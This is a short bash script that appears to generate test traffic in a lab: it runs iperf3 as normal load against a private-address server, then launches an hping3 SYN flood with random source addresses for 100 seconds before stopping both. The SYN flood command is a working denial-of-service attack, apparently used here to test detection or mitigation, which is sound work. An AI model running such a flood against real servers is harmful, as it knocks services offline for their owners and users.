#!/bin/bash

SERVER_IP="192.168.95.143"
PORT=8080


# Start normal traffic (iperf client)
echo "[*] Sending legitimate traffic..."
iperf3 -c $SERVER_IP -p $PORT -b 10M -P 10 -t 140 &  # Runs for 140 seconds
IPERF_PID=$!

# Wait 20 seconds before starting attack
sleep 20

# Start SYN flood attack using hping3
echo "[*] Launching SYN flood attack..."
sudo hping3 -S --flood -p $PORT --rand-source $SERVER_IP &
HPING_PID=$!

# Wait 100 seconds
sleep 100

# Stop SYN flood attack
echo "[*] Stopping SYN flood attack..."
sudo kill -9 $HPING_PID

# Wait 20 seconds before stopping normal traffic
sleep 20

# Stop normal traffic
echo "[*] Stopping iperf client..."
kill -9 $IPERF_PID



echo "[*] Client test complete."